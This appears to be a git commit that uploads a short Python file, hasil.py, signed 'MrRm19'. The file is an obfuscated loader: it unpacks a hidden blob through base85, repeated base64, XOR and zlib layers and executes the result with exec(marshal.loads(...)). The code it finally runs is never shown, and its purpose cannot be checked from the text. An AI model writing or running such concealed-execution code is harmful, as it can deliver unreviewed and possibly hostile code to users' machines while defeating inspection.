66cc390649e33d6834e0b0019261236a35d08c52
Mr.Rm19 <ytpremdip45@gmail.com>
2026-02-04 14:26:15 -0800

    Add files via upload

---
+++ hasil.py
@@ -0,0 +1,10 @@
+# Auth: Ramdan19idatgmaildotcom
+import marshal, zlib, base64
+_0xRm19 = 'MrRm19'
+_0xKey = sum(ord(c) for c in _0xRm19) % 256
+_0xData = base64.b85decode('Ye-adOH)oOVRLG4HbiP}X=`nGSz}mia$zz=N@r?JXH_dTdPjJ5QZ`v)NLqAAS#3`*P;oFqYe+S6IC(=dH8^iLIe2DPK~X_-a&v8HHDN_iD@JEDGDl-nPiRL|a5gh|WKvdRXI5H9Ms0Ovb4heWSTQp;d31M1Vs=S#QgKCbSZP6eS6XmMb9gIcdRSI5NJ3g{M^-jVWil&RFKcvTWky3VS~*8|ZA^G;W<zmpVpnZ%PhxjTXg5iAGf{U{Wl?5wa5gVWPjF;MS};jeLN`JyVofh>QF(YoZ!&W?Gg)RYHcfa-XlQLgO>Iz8c1vtpcy%#0Id@4hX>Kq`IYL2WFLOjiF-T8iSx|a2VKsMoc{oUQVOnT%QFn7;WNU6xM@BI+a9U7GZAD2(G(u@&H7`;`N^L<;ICwTyLMwT9NqJ;2HD_69Rc=T{S9niYYg%njY-c?^')
+for _ in range(3):
+    _0xData = zlib.decompress(bytes([b ^ _0xKey for b in base64.b64decode(_0xData)]))
+exec(marshal.loads(_0xData))
+
+# Dedicated to: n3imylove
